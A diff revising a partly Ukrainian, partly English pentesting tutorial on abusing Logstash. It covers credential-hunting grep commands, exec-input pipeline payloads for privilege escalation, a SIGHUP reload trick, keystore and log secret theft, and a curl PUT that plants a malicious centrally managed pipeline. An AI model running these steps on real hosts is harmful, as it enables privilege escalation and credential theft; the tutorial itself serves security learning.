@@ -4,11 +4,11 @@
 
 ## Logstash
 
-Logstash використовується для **збирання, перетворення та відправлення журналів** через систему, відому як **pipelines**. Ці **pipelines** складаються з етапів **input**, **filter** та **output**. Цікава особливість виникає, коли Logstash працює на компрометованій машині.
+Logstash використовується для **збирання, перетворення та відправлення логів** через систему, відому як **pipelines**. Ці **pipelines** складаються зі стадій **input**, **filter** та **output**. Цікавий аспект виникає, коли Logstash працює на скомпрометованій машині.
 
-### Pipeline Configuration
+### Конфігурація Pipeline
 
-Pipelines налаштовуються у файлі **/etc/logstash/pipelines.yml**, який перераховує місця розташування конфігурацій pipelines:
+Конфігурації pipeline задаються у файлі **/etc/logstash/pipelines.yml**, який містить список шляхів до конфігурацій pipeline:
 ```yaml
 # Define your pipelines here. Multiple pipelines can be defined.
 # For details on multiple pipelines, refer to the documentation:
@@ -20,14 +20,14 @@ path.config: "/etc/logstash/conf.d/*.conf"
 path.config: "/usr/share/logstash/pipeline/1*.conf"
 pipeline.workers: 6
 ```
-Цей файл показує, де розташовані файли **.conf**, що містять конфігурації **pipelines**. При використанні **Elasticsearch output module** часто **pipelines** містять **Elasticsearch credentials**, які зазвичай мають широкі привілеї через те, що Logstash повинен записувати дані до Elasticsearch. Wildcards у шляхах конфігурацій дозволяють Logstash виконувати всі відповідні pipelines у вказаному каталозі.
+This file reveals where the **.conf** files, containing pipeline configurations, are located. When employing an **Elasticsearch output module**, it's common for **pipelines** to include **Elasticsearch credentials**, which often possess extensive privileges due to Logstash's need to write data to Elasticsearch. Wildcards in configuration paths allow Logstash to execute all matching pipelines in the designated directory.
 
-Якщо Logstash запускається з `-f <directory>` замість `pipelines.yml`, **усі файли всередині цього каталогу конкатенуються в лексикографічному порядку й парсяться як єдина конфігурація**. Це створює два наступальні наслідки:
+If Logstash is started with `-f <directory>` instead of `pipelines.yml`, **all files inside that directory are concatenated in lexicographical order and parsed as a single config**. This creates 2 offensive implications:
 
-- Додавання файлу, наприклад `000-input.conf` або `zzz-output.conf`, може змінити те, як збирається фінальна pipeline
-- Неправильний (malformed) файл може завадити завантаженню всієї pipeline, тому ретельно перевіряйте payloads перед тим, як покладатися на auto-reload
+- Підкинутий файл на кшталт `000-input.conf` або `zzz-output.conf` може змінити, як фінальний pipeline збирається
+- Неправильно сформований файл може завадити завантаженню всього pipeline, тож ретельно перевіряйте payloads перед тим, як покладатися на auto-reload
 
-### Швидка перевірка на скомпрометованому хості
+### Швидка розвідка на скомпрометованому хості
 
 На машині, де встановлено Logstash, швидко перевірте:
 ```bash
@@ -38,29 +38,29 @@ cat /etc/logstash/logstash.yml 2>/dev/null
 find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
 rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
 ```
-Також перевірте, чи доступний локальний API моніторингу. За замовчуванням він слухає на **127.0.0.1:9600**, що зазвичай достатньо після отримання доступу до хоста:
+Також перевірте, чи доступний локальний API моніторингу. За замовчуванням він прив'язується до **127.0.0.1:9600**, що зазвичай достатньо після отримання доступу до хоста:
 ```bash
 curl -s http://127.0.0.1:9600/?pretty
 curl -s http://127.0.0.1:9600/_node/pipelines?pretty
 curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
 ```
-Це зазвичай дає вам ID пайплайнів, деталі виконання та підтвердження, що ваш змінений pipeline було завантажено.
+Зазвичай це дає вам pipeline IDs, деталі виконання та підтвердження, що ваш змінений pipeline було завантажено.
 
-Облікові дані, відновлені з Logstash, зазвичай відкривають доступ до **Elasticsearch**, тому перегляньте [цю іншу сторінку про Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).
+Облікові дані, отримані з Logstash, часто відкривають доступ до **Elasticsearch**, тому перегляньте [цю сторінку про Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).
 
 ### Privilege Escalation via Writable Pipelines
 
-Щоб спробувати privilege escalation, спочатку визначте користувача, від імені якого працює сервіс Logstash, зазвичай користувач **logstash**. Переконайтеся, що ви відповідаєте **одній** із цих умов:
+Щоб спробувати privilege escalation, спочатку визначте користувача, від імені якого працює служба Logstash, зазвичай це користувач **logstash**. Переконайтеся, що ви відповідаєте **одній** з цих вимог:
 
-- Мати **write access** до файлу pipeline **.conf** **або**
+- Маєте **права запису** до файлу pipeline **.conf** **або**
 - Файл **/etc/logstash/pipelines.yml** використовує wildcard, і ви можете записувати в цільову папку
 
-Крім того, має бути виконана **одна** з цих умов:
+Додатково, повинна бути виконана **одна** з цих умов:
 
-- Можливість перезапустити сервіс Logstash **або**
-- Файл **/etc/logstash/logstash.yml** має встановлене **config.reload.automatic: true**
+- Можливість перезапустити службу Logstash **або**
+- Файл **/etc/logstash/logstash.yml** має встановленим **config.reload.automatic: true**
 
-Якщо у конфігурації використано wildcard, створення файлу, який відповідає цьому wildcard, дозволяє виконувати команди. Наприклад:
+За наявності wildcard у конфігурації, створення файлу, який відповідає цьому wildcard, дозволяє виконувати команди. Наприклад:
 ```bash
 input {
 exec {
@@ -76,15 +76,15 @@ codec => rubydebug
 }
 }
 ```
-Тут, **interval** визначає частоту виконання у секундах. У наведеному прикладі команда **whoami** виконується кожні 120 секунд, а її вивід спрямовується до **/tmp/output.log**.
+Тут **interval** визначає частоту виконання в секундах. У наведеному прикладі команда **whoami** виконується кожні 120 секунд, а її вивід спрямовується в **/tmp/output.log**.
 
-Якщо в **/etc/logstash/logstash.yml** встановлено **config.reload.automatic: true**, Logstash автоматично виявлятиме й застосовуватиме нові або змінені конфігурації pipeline без потреби перезапуску. Якщо немає wildcard, модифікації все ще можна вносити до існуючих конфігурацій, але слід бути обережним, щоб уникнути збоїв.
+При встановленому **config.reload.automatic: true** у **/etc/logstash/logstash.yml**, Logstash автоматично виявляє та застосовує нові або змінені конфігурації pipeline без перезапуску. Якщо немає wildcard, зміни все ще можна вносити в існуючі конфігурації, але слід бути обережним, щоб уникнути збоїв.
 
-### Більш надійні Pipeline payloads
+### Більш надійні Pipeline Payloads
 
-Плагін вводу `exec` досі працює в поточних релізах і вимагає або `interval`, або `schedule`. Він виконується шляхом **forking** Logstash JVM, тож якщо пам'ять обмежена, ваш payload може зазнати збою з `ENOMEM` замість того, щоб працювати мовчки.
+Вхідний плагін `exec` все ще працює в актуальних релізах і вимагає або `interval`, або `schedule`. Він виконується шляхом **forking** Logstash JVM, тому якщо пам'яті мало, ваш payload може завершитися з `ENOMEM` замість того, щоб виконатися непомітно.
 
-Більш практичний privilege-escalation payload зазвичай — той, що залишає стійкий артефакт:
+Більш практичний privilege-escalation payload зазвичай — це такий, який залишає стійкий артефакт:
 ```bash
 input {
 exec {
@@ -96,20 +96,20 @@ output {
 null {}
 }
 ```
-Якщо ви не маєте прав на перезапуск, але можете посилати сигнал процесу, Logstash також підтримує перезавантаження, ініційоване за допомогою **SIGHUP** на Unix-подібних системах:
+Якщо у вас немає прав на перезапуск, але ви можете посилати сигнал процесу, Logstash також підтримує перезавантаження, ініційоване **SIGHUP**, у Unix-подібних системах:
 ```bash
 kill -SIGHUP $(pgrep -f logstash)
 ```
-Майте на увазі, що не кожен плагін підтримує автоматичне повторне завантаження. Наприклад, введення **stdin** перешкоджає автоматичному перезавантаженню, тож не варто припускати, що `config.reload.automatic` завжди підхопить ваші зміни.
+Be aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume `config.reload.automatic` will always pick up your changes.
 
 ### Викрадення секретів з Logstash
 
-Перш ніж зосереджуватись лише на виконанні коду, зберіть дані, до яких Logstash уже має доступ:
+Перед тим як зосереджуватися лише на виконанні коду, зберіть дані, до яких Logstash вже має доступ:
 
-- Паролі у відкритому тексті часто захардкоджені всередині `elasticsearch {}` outputs, `http_poller`, JDBC inputs або налаштувань, пов'язаних з хмарою
+- Облікові дані у відкритому тексті часто захардкожені всередині `elasticsearch {}` outputs, `http_poller`, JDBC inputs, або cloud-related settings
 - Безпечні налаштування можуть зберігатися в **`/etc/logstash/logstash.keystore`** або в іншому каталозі `path.settings`
-- Пароль до keystore часто передається через **`LOGSTASH_KEYSTORE_PASS`**, а пакункові інсталяції зазвичай беруть його з **`/etc/sysconfig/logstash`**
-- Розгортання змінних середовища у вигляді `${VAR}` відбувається під час старту Logstash, тож середовище сервісу варто перевірити
+- Пароль keystore часто передається через **`LOGSTASH_KEYSTORE_PASS`**, а пакункові інсталяції зазвичай підхоплюють його з **`/etc/sysconfig/logstash`**
+- Розширення змінних середовища з `${VAR}` вирішується під час запуску Logstash, тож має сенс перевірити середовище служби
 
 Корисні перевірки:
 ```bash
@@ -120,17 +120,17 @@ cat /etc/sysconfig/logstash 2>/dev/null
 journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
 ls -lah /var/log/logstash 2>/dev/null
 ```
-Це також варто перевірити, адже **CVE-2023-46672** показала, що Logstash може записувати чутливу інформацію в логи за певних обставин. На хості після постексплуатації старі логи Logstash та записи `journald` можуть розкрити облікові дані навіть якщо поточна конфігурація посилається на keystore замість зберігання секретів inline.
+Це також варто перевірити, оскільки **CVE-2023-46672** показала, що Logstash може фіксувати конфіденційну інформацію в логах за певних обставин. На хості після постексплуатації старі логи Logstash та записи `journald` можуть розкрити облікові дані навіть якщо поточна конфігурація посилається на keystore замість зберігання секретів inline.
 
 ### Зловживання централізованим керуванням pipeline
 
-У деяких середовищах хост взагалі не покладається на локальні файли `.conf`. Якщо **`xpack.management.enabled: true`** налаштовано, Logstash може витягувати централізовано керовані pipeline з Elasticsearch/Kibana, і після увімкнення цього режиму локальні конфіги pipeline більше не є джерелом істини.
+В деяких середовищах хост зовсім не покладається на локальні файли `.conf`. Якщо **`xpack.management.enabled: true`** налаштовано, Logstash може завантажувати централізовано керовані pipelines з Elasticsearch/Kibana, і після увімкнення цього режиму локальні конфіги pipeline більше не є джерелом істини.
 
-Це означає інший шлях атаки:
+Це означає інший вектор атаки:
 
 1. Отримати облікові дані Elastic з локальних налаштувань Logstash, keystore або логів
-2. Перевірити, чи має обліковий запис кластерну привілей **`manage_logstash_pipelines`**
-3. Створити або замінити централізовано керований pipeline, щоб хост Logstash виконав ваш payload при наступному інтервалі опитування
+2. Перевірити, чи має акаунт кластерну привілегію **`manage_logstash_pipelines`**
+3. Створити або замінити централізовано керований pipeline так, щоб хост Logstash виконав ваш payload при наступному опитуванні
 
 The Elasticsearch API used for this feature is:
 ```bash
@@ -144,7 +144,7 @@ curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
 "pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
 }'
 ```
-Це особливо корисно, коли локальні файли доступні лише для читання, але Logstash вже зареєстровано для віддаленого отримання pipelines.
+Це особливо корисно, коли локальні файли доступні лише для читання, але Logstash вже зареєстрований для віддаленого отримання pipelines.
 
 ## Посилання
 
